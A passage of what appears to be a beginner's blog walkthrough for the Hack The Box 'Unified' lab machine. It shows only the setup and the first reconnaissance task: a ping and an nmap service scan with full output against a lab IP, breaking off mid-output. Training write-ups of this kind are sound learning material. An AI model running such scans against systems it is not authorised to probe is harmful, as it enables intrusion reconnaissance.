@@ -1,0 +1,581 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Unified - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,unified,tier-2,free-tier,web,vulnerability-assessment,databases,injection,custom-applications,outdated-software,mongodb,java,reconnaissance,clear-text-credentials,default-credentials,code-injection"><meta name=description content="The aim of this walkthrough is to provide help with the Unified machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
+It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
+SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/unified/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Unified - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Unified machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
+It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
+SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/unified/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-21T08:00:00+00:00"><meta property="article:modified_time" content="2023-05-21T08:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Unified - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Unified machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
+It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
+SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Unified - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/unified/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Unified - Walkthrough","name":"HTB - Unified - Walkthrough","description":"The aim of this walkthrough is to provide help with the Unified machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","unified","tier-2","free-tier","web","vulnerability-assessment","databases","injection","custom-applications","outdated-software","mongodb","java","reconnaissance","clear-text-credentials","default-credentials","code-injection"],"articleBody":"The aim of this walkthrough is to provide help with the Unified machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: Which are the first four open ports?\nStarting out with some recon, we first do a quick connection check\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.41]─[htb-bluewalle@htb-8iyjpno6j2]─[~/unified] └──╼ [★]$ ping $rhost -c 4 PING 10.129.157.249 (10.129.157.249) 56(84) bytes of data. 64 bytes from 10.129.157.249: icmp_seq=1 ttl=63 time=10.3 ms 64 bytes from 10.129.157.249: icmp_seq=2 ttl=63 time=10.3 ms 64 bytes from 10.129.157.249: icmp_seq=3 ttl=63 time=10.3 ms 64 bytes from 10.129.157.249: icmp_seq=4 ttl=63 time=10.1 ms --- 10.129.157.249 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.148/10.246/10.288/0.057 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.41]─[htb-bluewalle@htb-8iyjpno6j2]─[~/unified] └──╼ [★]$ to ensure that our target is correctly instantiated, then we follow up with our usual (version, script, top-1000-ports) nmap scan.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.41]─[htb-bluewalle@htb-8iyjpno6j2]─[~/unified] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 18:18 BST Nmap scan report for 10.129.157.249 Host is up (0.075s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy |_http-title: Did not follow redirect to https://10.129.157.249:8443/manage |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Sun, 21 May 2023 17:18:25 GMT | Connection: close | \u003c!doctype html\u003e","wordCount":"3586","inLanguage":"en","datePublished":"2023-05-21T08:00:00Z","dateModified":"2023-05-21T08:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/unified/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Unified - Walkthrough</h1><div class=post-meta><span title='2023-05-21 08:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;3586 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#task-9><strong>TASK 9</strong></a></li><li><a href=#task-10><strong>TASK 10</strong></a></li><li><a href=#task-11><strong>TASK 11</strong></a></li><li><a href=#task-12><strong>TASK 12</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Unified</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
+</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ $
+</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ $
+</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>Which are the first four open ports?</em></p><p>Starting out with some <strong>recon</strong>, we first do a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
+</span></span><span class=line><span class=cl>PING 10.129.157.249 <span class=o>(</span>10.129.157.249<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
+</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.157.249: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.3 ms
+</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.157.249: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.3 ms
+</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.157.249: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.3 ms
+</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.157.249: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.1 ms
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--- 10.129.157.249 ping statistics ---
+</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
+</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.148/10.246/10.288/0.057 ms
+</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
+</span></span></code></pre></div><p>to ensure that our <strong>target</strong> is correctly instantiated, then we follow up with our usual (version, script, top-1000-ports) <em><strong>nmap</strong></em> <strong>scan</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-21 18:18 BST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.157.249
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.075s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE         VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 48add5b83a9fbcbef7e8201ef6bfdeae <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> b7896c0b20ed49b2c1867c2992741c1f <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 18cd9d08a621a8b8b6f79f8d405154fb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>6789/tcp open  ibm-db2-admin?
+</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://10.129.157.249:8443/manage
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Language: en
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>431</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>21</span> May <span class=m>2023</span> 17:18:25 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class=m>404</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Found&lt;/title&gt;&lt;style <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span>&gt;body <span class=o>{</span>font-family:Tahoma,Arial,sans-serif<span class=p>;</span><span class=o>}</span> h1, h2, h3, b <span class=o>{</span>color:white<span class=p>;</span>background-color:#525D76<span class=p>;</span><span class=o>}</span> h1 <span class=o>{</span>font-size:22px<span class=p>;</span><span class=o>}</span> h2 <span class=o>{</span>font-size:16px<span class=p>;</span><span class=o>}</span> h3 <span class=o>{</span>font-size:14px<span class=p>;</span><span class=o>}</span> p <span class=o>{</span>font-size:12px<span class=p>;</span><span class=o>}</span> a <span class=o>{</span>color:black<span class=p>;</span><span class=o>}</span> .line <span class=o>{</span>height:1px<span class=p>;</span>background-color:#525D76<span class=p>;</span>border:none<span class=p>;</span><span class=o>}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class=m>404</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest, HTTPOptions: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>302</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Location: http://localhost:8080/manage
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>21</span> May <span class=m>2023</span> 17:18:25 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>   RTSPRequest, Socks5: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>utf-8
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Language: en
+</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>435</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>21</span> May <span class=m>2023</span> 17:18:25 GMT
+</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
+</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span class=m>400</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>     Request&lt;/title&gt;&lt;style <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span>&gt;body <span class=o>{</span>font-family:Tahoma,Arial,sans-serif<span class=p>;</span><span class=o>}</span> h1, h2, h3, b <span class=o>{</span>color:white<span class=p>;</span>background-color:#525D76<span class=p>;</span><span class=o>}</span> h1 <span class=o>{</span>font-size:22px<span class=p>;</span><span class=o>}</span> h2 <span class=o>{</span>font-size:16px<span class=p>;</span><span class=o>}</span> h3 <span class=o>{</span>font-size:14px<span class=p>;</span><span class=o>}</span> p <span class=o>{</span>font-size:12px<span class=p>;</span><span class=o>}</span> a <span class=o>{</span>color:black<span class=p>;</span><span class=o>}</span> .line <span class=o>{</span>height:1px<span class=p>;</span>background-color:#525D76<span class=p>;</span>border:none<span class=p>;</span><span class=o>}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span class=m>400</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span class=line><span class=cl>8443/tcp open  ssl/nagios-nsca Nagios NSCA
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>UniFi/organizationName<span class=o>=</span>Ubiquiti Inc./stateOrProvinceName<span class=o>=</span>New York/countryName<span class=o>=</span>US
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:UniFi
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-12-30T21:37:24
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-04-03T21:37:24
+</span></span><span class=line><span class=cl><span class=p>|</span> http-title: UniFi Network
+</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was /manage/account/login?redirect<span class=o>=</span>%2Fmanage
+</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class=line><span class=cl>SF-Port8080-TCP:V<span class=o>=</span>7.93%I<span class=o>=</span>7%D<span class=o>=</span>5/21%Time<span class=o>=</span>646A5260%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>Ge
+</span></span><span class=line><span class=cl>SF:tRequest,84,<span class=s2>&#34;HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080
+</span></span></span><span class=line><span class=cl><span class=s2>SF:/manage\r\nContent-Length:\x200\r\nDate:\x20Sun,\x2021\x20May\x202023\x
+</span></span></span><span class=line><span class=cl><span class=s2>SF:2017:18:25\x20GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,84,<span class=s2>&#34;H
+</span></span></span><span class=line><span class=cl><span class=s2>SF:TTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\nCon
+</span></span></span><span class=line><span class=cl><span class=s2>SF:tent-Length:\x200\r\nDate:\x20Sun,\x2021\x20May\x202023\x2017:18:25\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:GMT\r\nConnection:\x20close\r\n\r\n&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,24E,<span class=s2>&#34;HTTP/1\.1\x204
+</span></span></span><span class=line><span class=cl><span class=s2>SF:00\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:
+</span></span></span><span class=line><span class=cl><span class=s2>SF:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sun,\x2021\x20May\x202023\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x2017:18:25\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;ht
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ml\x20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x2
+</span></span></span><span class=line><span class=cl><span class=s2>SF:0Bad\x20Request&lt;/title&gt;&lt;style\x20type=\&#34;text/css\&#34;&gt;body\x20{font-family
+</span></span></span><span class=line><span class=cl><span class=s2>SF::Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;ba
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ckground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size
+</span></span></span><span class=line><span class=cl><span class=s2>SF::16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{c
+</span></span></span><span class=line><span class=cl><span class=s2>SF:olor:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:n
+</span></span></span><span class=line><span class=cl><span class=s2>SF:one;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20
+</span></span></span><span class=line><span class=cl><span class=s2>SF:Bad\x20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>FourOhFourRequest,24A,<span class=s2>&#34;HTTP/1\.1\
+</span></span></span><span class=line><span class=cl><span class=s2>SF:x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
+</span></span></span><span class=line><span class=cl><span class=s2>SF:age:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Sun,\x2021\x20May\x202
+</span></span></span><span class=line><span class=cl><span class=s2>SF:023\x2017:18:25\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html
+</span></span></span><span class=line><span class=cl><span class=s2>SF:&gt;&lt;html\x20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20404\x20\xe2\x80\x9
+</span></span></span><span class=line><span class=cl><span class=s2>SF:3\x20Not\x20Found&lt;/title&gt;&lt;style\x20type=\&#34;text/css\&#34;&gt;body\x20{font-fami
+</span></span></span><span class=line><span class=cl><span class=s2>SF:ly:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;
